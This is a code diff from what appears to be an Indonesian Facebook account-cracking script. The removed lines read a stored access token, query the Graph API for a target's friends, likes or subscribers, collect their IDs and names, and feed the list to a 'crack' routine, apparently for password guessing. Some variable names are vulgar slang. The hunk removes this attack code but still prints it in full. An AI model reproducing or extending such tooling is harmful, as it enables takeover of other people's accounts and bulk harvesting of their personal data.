@@ -238,49 +238,6 @@ class menu:
 					id = []
 					for a in z['friends']['data']:
 						id.append(a['id'] + '<=>' + a['name'])
-				except KeyError:
-					pass
-				else:
-					pass
-			crack().fbeh(id)
-		elif usna in ['3','03']:
-			pepek = open('token.x','r').read()
-			try:
-				print(' %s║'%(N))
-				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
-				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,pepek))
-				z = json.loads(r.text)
-				id = []
-				for a in z['data']:
-					id.append(a['id'] + '<=>' + a['name'])
-			except KeyError:
-				print(' %s╚═[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(3);menu().main()
-			else:
-				crack().fbeh(id)
-		elif usna in ['4','04']:
-			memek = open('token.x','r').read()
-			try:
-				print(' %s║'%(N))
-				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
-				r = requests.get('https://graph.facebook.com/%s/likes?limit=50000&access_token=%s'%(idt,memek))
-				z = json.loads(r.text)
-				id = []
-				for e in z['data']: # MEMEK
-					id.append(e['id'] + '<=>' + e['name'])
-			except KeyError:
-				print(' %s╚═[%s!%s] ID %s Tidak di temukan'%(N,O,N,idt));time.sleep(2);menu().main()
-			else:
-				crack().fbeh(id)
-		elif usna in ['5','05']:
-			khamdihiXDX = open('token.x','r').read()
-			try:
-				print(' %s║'%(N))
-				idt = input(' %s╠═[%s•%s] Masukan id : '%(N,O,N))
-				r = requests.get('https://graph.facebook.com/%s/subscribers?limit=50000&access_token=%s'%(idt,khamdihiXDX))
-				z = json.loads(r.text)
-				id = []
-				for w in z['data']:
-					id.append(w['id'] + '<=>' + w['name'])
 			except KeyError:
 				print(' %s╚═[%s!%s] ID %s tidak publik'%(N,O,N,idt));time.sleep(2);menu().main()
 			else:
